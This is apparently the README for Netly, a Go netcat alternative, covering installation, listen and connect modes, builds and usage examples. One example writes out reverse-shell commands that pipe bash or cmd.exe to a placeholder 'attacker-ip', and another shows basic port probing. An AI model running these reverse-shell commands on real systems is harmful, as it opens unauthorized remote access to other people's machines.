# 🚀 Netly

<div align="center">

![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=for-the-badge&logo=go)
![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-blue?style=for-the-badge)

**A modern, fast, and beautiful netcat alternative built with Go**

*Created by [penguinshero](https://github.com/penguinshero)*

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Examples](#-examples) • [Contributing](#-contributing)

</div>

---

## 📋 Table of Contents

- [About](#-about)
- [Features](#-features)
- [Installation](#-installation)
- [Usage](#-usage)
- [Examples](#-examples)
- [Building from Source](#-building-from-source)
- [Contributing](#-contributing)
- [License](#-license)

## 🎯 About

Netly is a modern replacement for the classic netcat utility, designed for ethical hackers, penetration testers, and network administrators. Built with Go and powered by the Charm Bracelet framework, it offers a beautiful terminal UI while maintaining the speed and efficiency you need.

## ✨ Features

- 🎨 **Beautiful TUI** - Powered by Bubble Tea and Lipgloss
- ⚡ **Blazing Fast** - Written in Go for maximum performance
- 🔄 **Dual Modes** - Server (Listen) and Client (Connect) modes
- 🖥️ **Interactive GUI** - Menu-driven interface for easy mode switching
- 💻 **CLI Support** - Direct command-line operations
- 🔌 **Bidirectional** - Full-duplex communication
- 📦 **Single Binary** - No dependencies, just run it
- 🌐 **Cross-Platform** - Works on Linux, Windows, and macOS
- 🛡️ **Ethical Usage** - Built for security professionals

## 📥 Installation

### Pre-built Binaries

Download the latest release from the [Releases](https://github.com/penguinshero/netly/releases) page.

### Using Go Install

```bash
go install github.com/penguinshero/netly@latest
```

### Building from Source

```bash
# Clone the repository
git clone https://github.com/penguinshero/netly.git
cd netly

# Install dependencies
go mod download

# Build the binary
go build -o netly

# Optional: Install to system
sudo mv netly /usr/local/bin/
```

## 🚀 Usage

### Interactive Mode (GUI)

Run netly without arguments to start the interactive mode:

```bash
netly
```

Or explicitly:

```bash
netly interactive
```

### Direct Commands

#### Listen Mode (Server)

Start a server listening on a specific port:

```bash
netly listen 4444
```

#### Connect Mode (Client)

Connect to a remote host:

```bash
netly connect 192.168.1.100 4444
```

### Help Menu

Get detailed help:

```bash
netly --help
netly listen --help
netly connect --help
```

## 📖 Examples

### Example 1: File Transfer

**On the receiver (Server):**
```bash
netly listen 4444 > received_file.txt
```

**On the sender (Client):**
```bash
cat file.txt | netly connect 192.168.1.100 4444
```

### Example 2: Remote Shell (Educational Purposes Only)

**Reverse Shell - Target Machine:**
```bash
# Linux/Mac
/bin/bash -i 2>&1 | netly connect attacker-ip 4444

# Windows
netly connect attacker-ip 4444 -e cmd.exe
```

**Attacker Machine:**
```bash
netly listen 4444
```

### Example 3: Chat Server

**Server Side:**
```bash
netly listen 8080
```

**Client Side:**
```bash
netly connect server-ip 8080
```

Now you can type messages and they'll be sent bidirectionally!

### Example 4: Port Scanning (Basic)

```bash
# Test if port is open
echo "test" | netly connect target-ip 80
```

## 🔧 Building from Source

### Prerequisites

- Go 1.21 or higher
- Git

### Build Steps

```bash
# Clone repository
git clone https://github.com/penguinshero/netly.git
cd netly

# Download dependencies
go mod download

# Build for current platform
go build -o netly

# Build for specific platforms
# Linux
GOOS=linux GOARCH=amd64 go build -o netly-linux-amd64

# Windows
GOOS=windows GOARCH=amd64 go build -o netly-windows-amd64.exe

# macOS
GOOS=darwin GOARCH=amd64 go build -o netly-darwin-amd64
```

## 🎨 Screenshots

### Interactive Menu
```
    _   __     __  __     
   / | / /__  / /_/ /_  __
  /  |/ / _ \/ __/ / / / /
 / /|  /  __/ /_/ / /_/ / 
/_/ |_/\___/\__/_/\__, /  
                 /____/   

Modern Netcat Alternative v1.0.0 | by penguinshero

╔═══════════════════════════════════════╗
║         SELECT OPERATION MODE         ║
╚═══════════════════════════════════════╝

  1. Listen Mode (Server)    - Accept incoming connections
  2. Connect Mode (Client)   - Connect to remote host
  3. Exit

→ Enter choice...
```

## 🛠️ Dependencies

- [Bubble Tea](https://github.com/charmbracelet/bubbletea) - Terminal UI framework
- [Lipgloss](https://github.com/charmbracelet/lipgloss) - Style definitions
- [Cobra](https://github.com/spf13/cobra) - CLI framework

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## ⚠️ Disclaimer

This tool is intended for educational purposes and ethical security testing only. Always ensure you have proper authorization before testing or accessing any systems. The author is not responsible for any misuse or damage caused by this tool.

## 👤 Author

**penguinshero**

- GitHub: [@penguinshero](https://github.com/penguinshero)

## 🌟 Star History

If you find this project useful, please consider giving it a star! ⭐

## 📝 Changelog

### v1.0.0 (Initial Release)
- Interactive GUI mode
- Direct CLI commands
- Server/Client modes
- Bidirectional communication
- Beautiful terminal UI
- Cross-platform support

---

<div align="center">

Made with ❤️ by penguinshero

**[⬆ back to top](#-netly)**

</div>

